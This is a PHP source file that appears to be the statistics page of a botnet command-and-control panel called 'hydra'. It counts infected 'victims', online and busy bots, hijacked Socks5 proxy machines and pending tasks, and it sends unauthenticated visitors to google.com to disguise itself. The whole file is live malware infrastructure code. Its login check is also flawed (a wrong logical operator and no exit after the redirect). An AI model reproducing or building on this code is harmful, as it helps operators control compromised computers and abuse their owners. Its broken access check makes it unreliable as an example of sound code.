<?php
	session_start();
	if(!isset($_SESSION['hydra_loggedin']) && $_SESSION['hydra_loggedin'] != 1)
	{
		header("Location: http://www.google.com");
	}
	include("inc/config.php");
	include("inc/funcs.php");
	
	$query = mysql_query("
	SELECT (SELECT count(*) FROM hydra_victims) AS bots,
	(SELECT count(*) FROM hydra_victims WHERE ConTime >".(time()-$time_on).") AS bots_online,
	(SELECT count(*) FROM hydra_victims WHERE ConTime >".(time()-86400).") AS bots_online24,
	(SELECT count(*) FROM hydra_victims WHERE ConTime >".(time()-604800).") AS bots_online7,
	(SELECT count(*) FROM hydra_victims WHERE ConTime >".(time()-$time_on)." AND taskID != 0) AS bots_busy,
	(SELECT count(*) FROM hydra_tasks AS t WHERE t.elapsed > '".time()."' OR (t.elapsed=0 AND (SELECT count(*) FROM hydra_task_done WHERE taskID=t.taskID)<bots)) AS tasks
	");
	$ds=mysql_fetch_array($query);
	$query3 = mysql_query("SELECT hwid FROM hydra_socks");
	$socks_online = 0;
	while($socks_hwid = mysql_fetch_array($query3))
	{
		$query4 = mysql_query("SELECT * FROM hydra_victims WHERE HWID = '".mysql_real_escape_string($socks_hwid['hwid'])."' AND ConTime > '".(time()-$time_on)."'");
		$socks_online += mysql_num_rows($query4);
	}
	$table = '<table class="smalltable" width="280px">';
	$table .= '<tr><td style="text-align:left;">Total Bots:</td><td><b>'.$ds['bots'].' Bots</b></td></tr>';
	if(!$ds['bots']) $ds['bots'] = 1;
	$table .= '<tr><td style="text-align:left;">Bots Online:</td><td><b>'.$ds['bots_online'].' Bots</b> ('.round($ds['bots_online']/$ds['bots']*100, 2).'%)</td></tr>';
	$table .= '<tr><td style="text-align:left;">Bots Offline:</td><td><b>'.($ds['bots']-$ds['bots_online']).' Bots</b> ('.round(($ds['bots'] ? ($ds['bots']-$ds['bots_online'])/$ds['bots']*100 : 0), 2).'%)</td></tr>';
	$table .= '<tr><td style="text-align:left;">Socks5 Online:</td><td><b>'.$socks_online.' Server</b></td></tr>';
	$table .= '<tr><td style="text-align:left;">Bots Online (24 hours):</td><td><b>'.$ds['bots_online24'].' Bots</b> ('.round($ds['bots_online24']/$ds['bots']*100, 2).'%)</td></tr>';
	$table .= '<tr><td style="text-align:left;">Bots Online (7 days):</td><td><b>'.$ds['bots_online7'].' Bots</b> ('.round($ds['bots_online7']/$ds['bots']*100, 2).'%)</td></tr>';
	$table .= '<tr><td style="text-align:left;">Busy Bots:</td><td><b>'.$ds['bots_busy'].' Bots</b> ('.round($ds['bots_busy']/$ds['bots']*100, 2).'%)</td></tr>';
	$table .= '<tr><td style="text-align:left;">Active Tasks:</td><td><b>'.$ds['tasks'].' Tasks</b></td></tr>';
	echo $table;
?>